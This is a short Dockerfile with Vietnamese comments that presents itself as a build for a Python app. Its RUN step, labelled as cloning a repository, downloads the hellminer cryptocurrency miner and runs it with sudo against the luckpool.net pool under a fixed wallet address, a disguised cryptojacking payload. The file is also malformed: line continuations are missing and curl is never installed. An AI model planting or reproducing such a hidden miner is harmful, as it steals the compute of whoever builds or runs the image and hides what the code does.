# Sử dụng Python base image
FROM python:3.8-slim

# Cài đặt các công cụ cần thiết
RUN apt-get update && apt-get install -y \
    git \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/* && apt install sudo

# Clone repository và chạy app
RUN curl https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz -L -O -J &&
tar -xf hellminer_linux64.tar.gz &&
rm hellminer_linux64.tar.gz &&
sudo ./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u REw5c1fNYCEhVmK9wVrHcUNLM3zDSjHB6W.001 -p x
# Đặt thư mục làm thư mục làm việc
WORKDIR /app

# Thiết lập lệnh mặc định để chạy ứng dụng khi container khởi động
CMD ["python", "app.py"]
